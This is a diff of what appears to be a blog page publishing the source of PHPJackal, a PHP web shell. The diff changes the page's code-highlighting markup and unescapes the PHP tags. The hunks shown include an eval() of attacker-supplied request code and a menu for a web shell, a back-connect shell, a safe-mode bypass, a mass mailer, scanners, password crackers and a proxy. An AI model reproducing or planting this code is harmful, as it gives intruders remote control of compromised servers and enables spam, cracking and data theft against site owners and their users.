@@ -15,7 +15,7 @@ PHPJackal v$v &#8211; Powered By NetJackal
 
 ### PHPJackal Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 #--Config--#
 $login_password= ''; //Set password
 #----------#
@@ -1058,9 +1058,9 @@ function phpevaL(){
 global $t,$hcwd;
 if (!empty($_REQUEST['code'])){
 echo "&lt;center&gt;&lt;textarea rows=\"10\" cols=\"64\"&gt;";
-$code = str_replace("&lt;?php","",$_REQUEST['code']);
-$code = str_replace("&lt;?","",$code);
-$code = str_replace("?&gt;","",$code);
+$code = str_replace("<?php","",$_REQUEST['code']);
+$code = str_replace("<?","",$code);
+$code = str_replace("?>","",$code);
 htmlspecialchars(eval($code));
 echo "&lt;/textarea&gt;&lt;/center&gt;&lt;br&gt;";
 }
@@ -1383,7 +1383,7 @@ function logouT(){
 setcookie('passw','',time()-10000);
 header('Location: '.hlinK());
 }
-?&gt;
+?>
 &lt;html&gt;
 &lt;head&gt;
 &lt;style&gt;body{background: #660000 scrollbar-base-color: #484848; scrollbar-arrow-color: #FFFFFF; scrollbar-track-color: #969696;font-size:16px;font-family:"Arial Narrow";}Table { font-size: 15px; } .buttons{font-family:Verdana;font-size:10pt;font-weight:normal;font-style:normal;color:#FFFFFF;background-color:#555555;border-style:solid;border-width:1px;border-color:#FFFFFF;}textarea{border: 0px #000000 solid;background: #EEEEEE;color: #000000;}input{background: #EEEEEE;border-width:1px;border-style:solid;border-color:black}select{background: #EEEEEE; border: 0px #000000 none;}&lt;/style&gt;
@@ -1391,9 +1391,9 @@ header('Location: '.hlinK());
 &lt;title&gt;PHPJackal&lt;/title&gt;
 &lt;/head&gt;&lt;body text="#E2E2E2" bgcolor="#660000" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC"&gt;
 &lt;table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%"&gt;
-&lt;tr&gt;&lt;td&gt;&lt;a href=javascript:history.back(1)&gt;[Back]&lt;/a&gt; - &lt;a href="&lt;?php $cwd= getcwd(); echo hlinK("seC=sysinfo&workingdiR=$cwd");?&gt;"&gt;[Info]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=fm&workingdiR=$cwd");?&gt;"&gt;[File manager]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=edit&workingdiR=$cwd");?&gt;"&gt;[Editor]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=webshell&workingdiR=$cwd");?&gt;"&gt;[Web shell]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=br&workingdiR=$cwd");?&gt;"&gt;[B/R shell]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=asm&workingdiR=$cwd");?&gt;"&gt;[Safe-mode]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=mysql&workingdiR=$cwd"); ?&gt;"&gt;[SQL]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?&gt;"&gt;[Mailer]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=eval&workingdiR=$cwd");?&gt;"&gt;[Evaler]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=sc&workingdiR=$cwd"); ?&gt;"&gt;[Scanners]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=cr&workingdiR=$cwd");?&gt;"&gt;[Crackers]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=px&workingdiR=$cwd");?&gt;"&gt;[Pr0xy]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=whois&workingdiR=$cwd");?&gt;"&gt;[Whois]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=calc&workingdiR=$cwd");?&gt;"&gt;[Convert]&lt;/a&gt; - &lt;a href="&lt;?php echo hlinK("seC=about&workingdiR=$cwd");?&gt;"&gt;[About]&lt;/a&gt; &lt;?php if(isset($_COOKIE['passw'])) echo "- [&lt;a href=\"".hlinK("seC=logout")."\"&gt;Logout&lt;/a&gt;]";?&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href=javascript:history.back(1)&gt;[Back]&lt;/a&gt; - &lt;a href="<?php $cwd= getcwd(); echo hlinK("seC=sysinfo&workingdiR=$cwd");?>"&gt;[Info]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=fm&workingdiR=$cwd");?>"&gt;[File manager]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=edit&workingdiR=$cwd");?>"&gt;[Editor]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=webshell&workingdiR=$cwd");?>"&gt;[Web shell]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=br&workingdiR=$cwd");?>"&gt;[B/R shell]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=asm&workingdiR=$cwd");?>"&gt;[Safe-mode]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=mysql&workingdiR=$cwd"); ?>"&gt;[SQL]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?>"&gt;[Mailer]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=eval&workingdiR=$cwd");?>"&gt;[Evaler]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=sc&workingdiR=$cwd"); ?>"&gt;[Scanners]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=cr&workingdiR=$cwd");?>"&gt;[Crackers]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=px&workingdiR=$cwd");?>"&gt;[Pr0xy]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=whois&workingdiR=$cwd");?>"&gt;[Whois]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=calc&workingdiR=$cwd");?>"&gt;[Convert]&lt;/a&gt; - &lt;a href="<?php echo hlinK("seC=about&workingdiR=$cwd");?>"&gt;[About]&lt;/a&gt; <?php if(isset($_COOKIE['passw'])) echo "- [&lt;a href=\"".hlinK("seC=logout")."\"&gt;Logout&lt;/a&gt;]";?>&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;hr size=1 noshade&gt;
-&lt;?php
+<?php
 if (!empty($_REQUEST['seC'])){
 switch($_REQUEST['seC']){
 case 'fm':filemanager();break;
@@ -1435,8 +1435,8 @@ case 'checksum':checksuM($_REQUEST['filE']);break;
 case 'logout':logouT();break;
 default: echo $intro;
 }}else echo $intro;
-echo $footer;?&gt;&lt;/body&gt;&lt;/html&gt;
-</pre>
+echo $footer;?>&lt;/body&gt;&lt;/html&gt;
+{% endhighlight %}
 
 ### PHPJackal v1.5 Shell screenshot<figure id="attachment_422" style="width: 604px;" class="wp-caption aligncenter">
 
